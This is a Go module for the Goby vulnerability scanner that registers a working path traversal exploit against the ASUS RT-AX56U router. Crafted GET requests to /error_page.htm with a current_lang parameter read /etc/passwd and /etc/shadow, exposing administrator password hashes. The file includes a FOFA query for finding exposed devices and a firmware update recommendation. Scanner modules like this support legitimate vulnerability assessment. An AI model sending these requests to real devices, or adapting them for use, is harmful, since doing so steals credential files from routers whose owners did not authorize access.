package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ASUS RT-AX56U Sensitive Information Disclosure Vulnerability",
    "Description": "<p>The ASUS RT-AX56U is a WiFi6 dual band 1800M E-sports route that supports the WiFi6 (802.11ax) standard and 80MHz bandwidth to provide better network performance and efficiency. With Trend Micro ™ The supported AiProtection commercial level security protection function provides network security protection for all connected intelligent devices.</p><p>After the construction request is sent to the vulnerable device, the passwd or shadow file in the system can be read, causing the password information disclosure problem of the administrator user.</p>",
    "Product": "ASUS-RT-AX56U",
    "Homepage": "https://www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RT-AX56U/",
    "DisclosureDate": "2022-10-20",
    "Author": "chuanqiu",
    "FofaQuery": "banner=\"ASUS RT-AX56U\" || (body=\"RT-AX56U\" && title==\"ASUS Login\")",
    "GobyQuery": "banner=\"ASUS RT-AX56U\" || (body=\"RT-AX56U\" && title==\"ASUS Login\")",
    "Level": "2",
    "Impact": "<p>After the construction request is sent to the vulnerable device, the passwd or shadow file in the system can be read, causing the password information disclosure problem of the administrator user.</p>",
    "Recommendation": "<p>Update Firmware</p><p>Firmware download address:<a href=\"https://www.asus.com.cn/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/helpdesk_bios/?model2Name=RT-AX56U\">https://www.asus.com.cn/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/helpdesk_bios/?model2Name=RT-AX56U</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd,/etc/shadow",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/error_page.htm?current_lang=/////etc/passwd",
                "follow_redirect": false,
                "header": {
                    "Connection": "close",
                    "Content-Length": "0",
                    "User-Agent": "Mozilla/5.0",
                    "Referer": "https://127.0.0.1/Main_Login.asp"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:/bin/sh",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/error_page.htm?current_lang=////{{{filePath}}}",
                "follow_redirect": false,
                "header": {
                    "Connection": "close",
                    "Content-Length": "0",
                    "User-Agent": "Mozilla/5.0",
                    "Referer": "https://127.0.0.1/Main_Login.asp"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<title>(.+?)</title>"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "ASUS RT-AX56U 敏感信息泄漏漏洞",
            "Product": "ASUS-RT-AX56U",
            "Description": "<p>ASUS RT-AX56U为WiFi6双频1800M电竞路由，支持 WiFi6 (802.11ax) 标准和 80MHz 带宽提供更好的网络性能与效率。并搭载了Trend Micro™ 支持的 AiProtection 商业级安全防护功能，为所有连网的智能设备提供网络安全防护。<br></p><p>构造请求发送到存在漏洞的设备之后，可以读取系统中的passwd或shadow文件造成管理员用户的密码信息泄漏问题。<br></p>",
            "Recommendation": "<p>升级固件。</p><p>固件下载地址：<a href=\"https://www.asus.com.cn/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/helpdesk_bios/?model2Name=RT-AX56U\">https://www.asus.com.cn/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/helpdesk_bios/?model2Name=RT-AX56U</a></p>",
            "Impact": "<p>构造请求发送到存在漏洞的设备之后，可以读取系统中的passwd或shadow文件造成管理员用户的密码信息泄漏问题。<br><br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "ASUS RT-AX56U Sensitive Information Disclosure Vulnerability",
            "Product": "ASUS-RT-AX56U",
            "Description": "<p>The ASUS RT-AX56U is a WiFi6 dual band 1800M E-sports route that supports the WiFi6 (802.11ax) standard and 80MHz bandwidth to provide better network performance and efficiency. With Trend Micro ™ The supported AiProtection commercial level security protection function provides network security protection for all connected intelligent devices.</p><p>After the construction request is sent to the vulnerable device, the passwd or shadow file in the system can be read, causing the password information disclosure problem of the administrator user.<br><br></p>",
            "Recommendation": "<p>Update Firmware<br></p><p>Firmware download address:<a href=\"https://www.asus.com.cn/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/helpdesk_bios/?model2Name=RT-AX56U\">https://www.asus.com.cn/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/helpdesk_bios/?model2Name=RT-AX56U</a><br></p>",
            "Impact": "<p>After the construction request is sent to the vulnerable device, the passwd or shadow file in the system can be read, causing the password information disclosure problem of the administrator user.<br><br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10786"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
